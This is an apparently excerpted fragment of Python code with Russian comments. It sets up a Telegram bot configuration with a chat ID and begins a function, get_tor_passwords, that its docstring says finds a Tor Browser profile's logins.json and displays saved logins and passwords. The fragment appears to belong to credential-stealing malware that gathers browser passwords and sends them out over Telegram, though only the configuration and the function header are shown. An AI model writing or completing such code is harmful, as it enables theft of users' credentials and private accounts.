...
# ========================-1002244070038
TELEGRAM_CONFIG = {
    "CHAT_ID": "-2445587234",  # Здесь укажите нужный chat_id
...
def get_tor_passwords(tor_profile_path=None):
    """
    Ищет logins.json в профиле Tor Browser и показывает логины/пароли без расшифровки (если не используется master-password).
    По умолчанию ищет в папке Tor Browser\Browser\TorBrowser\Data\Browser\profile.default
    """
